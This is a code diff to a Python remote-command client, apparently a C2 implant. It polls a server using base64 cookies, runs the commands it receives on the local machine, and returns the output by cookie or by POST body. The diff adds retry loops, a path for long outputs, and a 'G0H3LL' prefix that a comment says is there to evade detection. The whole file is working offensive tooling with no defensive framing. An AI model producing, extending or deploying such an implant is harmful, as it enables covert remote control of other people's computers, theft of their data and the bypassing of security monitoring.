@@ -1,3 +1,10 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#
+# Code by Green-m
+# Tested with python2.7 and python3.8
+#
+#
 import base64
 import os
 import sys
@@ -12,7 +19,7 @@ global headers
 #
 # URL and http headers
 #
-#url = "https://ytgynipjfx-8443-cce-5.lf.templink.dev/"
+#url = "https://ytgynipjfx-8443-cce-5.lf.templink.dev"
 url = "https://127.0.0.1:44443"
 url += "/search/"
 headers = [
@@ -49,10 +56,6 @@ def debase64ify(bytes_or_str):
     else:
         return output_bytes
 
-
-
-
-
 #
 # Import urllib and ssl for all versions of python,
 # this code from msf.
@@ -74,7 +77,16 @@ def say_hello():
     opener.addheaders = headers
     opener.addheaders = [('Cookie', 'SEVMTE8=')]  # base64 "HELLO"
     random_url = uuid.uuid4().hex
-    response = opener.open(url + random_url).read()
+    
+    for i in range(10):
+        try:
+            response = opener.open(url + random_url).read()
+            break
+        except Exception as e:
+            print("connect error,try again")
+            time.sleep(1)
+            continue
+
     if type(response) == bytes:
         response = response.decode('utf-8')
     opener.close()
@@ -91,11 +103,20 @@ def fetch_cmd():
     opener.addheaders = headers
     opener.addheaders = [('Cookie', 'QVNL')]  # base64 "ASK"
     random_url = uuid.uuid4().hex
-    response = opener.open(url + random_url).read()
-    opener.close()
+    #response = opener.open(url + random_url).read()
+    for i in range(10):
+        try:
+            response = opener.open(url + random_url).read()
+            break
+        except Exception as  e:
+            print("connect error,try again")
+            time.sleep(1)
+            continue
+
     if type(response) == bytes:
         response = response.decode('utf-8')
     index = response.rfind('>') + 1
+    opener.close()
     return debase64ify(response[index:])
 
 # run command locally
@@ -107,15 +128,52 @@ def run_cmd(cmd):
         return stderr.decode("utf-8")
     return stdout.decode("utf-8")
 
+#
+# If length of result of execution bigger than 4000,
+# post it in body, not in the cookie.
+#
+def reply_server_with_body(output):
+    reply_str = base64ify(output.encode("utf-8"))
+    opener = ul.build_opener(*hs)
+    opener.addheaders = headers
+    opener.addheaders = [('Cookie', 'VDBMME5H')]  # T0L0NG base64
+    random_url = uuid.uuid4().hex
+    #opener.open(url + random_url).read()
+    for i in range(10):
+        try:
+            opener.open(url + random_url, ('G0H3LL' + reply_str).encode('utf-8')).read() # Add G0H3LL to evade detection.
+            break
+        except Exception as  e:
+            print("connect error,try again")
+            print(str(e))
+            time.sleep(1)
+            continue
+    opener.close()
 
+
+#
+# cookie max length is 4096
+#
 def reply_server(output):
-    #reply_str = str(base64.b64encode(output.encode("utf-8")))
-    reply_str = str(base64ify(output.encode("utf-8")))
+    reply_str = base64ify(output.encode("utf-8"))
+
+    if len(reply_str) > 4000:
+        reply_server_with_body(output)
+        return
+
     opener = ul.build_opener(*hs)
     opener.addheaders = headers
     opener.addheaders = [('Cookie', reply_str)]  # base64 output
     random_url = uuid.uuid4().hex
-    opener.open(url + random_url).read()
+    #opener.open(url + random_url).read()
+    for i in range(10):
+        try:
+            opener.open(url + random_url).read()
+            break
+        except Exception as  e:
+            print("connect error,try again")
+            time.sleep(1)
+            continue
     opener.close()
 
 
